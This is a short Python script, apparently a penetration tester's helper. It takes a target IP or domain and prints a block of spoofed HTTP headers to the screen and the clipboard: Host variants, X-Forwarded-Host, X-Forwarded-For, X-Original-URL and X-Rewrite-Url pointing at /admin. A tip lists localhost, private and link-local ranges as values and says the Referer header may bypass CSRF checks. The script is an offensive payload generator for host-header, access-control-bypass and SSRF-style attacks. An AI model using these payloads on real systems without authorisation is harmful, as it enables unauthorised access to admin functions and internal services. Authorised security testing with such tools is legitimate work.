#!/bin/python3


import sys
import pyperclip
from termcolor import colored


if len(sys.argv) != 2:
    print('Needs args, IP/domain')
    print(f'Usage: {sys.argv[0]} <IP/domain>')
    sys.exit()
    
    

uri = sys.argv[1]

print(colored("""
- TRY 2 HOST HEADERS (one with space)'
- Referer header may bypass CSRF (delete/modify)'

Values:
    127.0.0.1 (or anything in the 127.0.0.0/8 or ::1/128 address spaces)
    localhost
    Any RFC1918 address:
    10.0.0.0/8
    172.16.0.0/12
    192.168.0.0/16
    Link local addresses: 169.254.0.0/16
""", 'red'))


output = f"""
Host: {uri}
 Host: {uri}
X-Host: {uri}
X-Forwarded-Host: {uri}
X-Forwarded-Server: {uri}
Forwarded: {uri}
X-Forwarded-For: {uri}
X-HTTP-Host-Override: {uri}
X-Remote-Addr: {uri}
Referer: {uri}

X-Rewrite-Url: /admin
X-Original-URL: /admin

X-Forwarded-Proto: https 
"""

print(output)
pyperclip.copy(output)

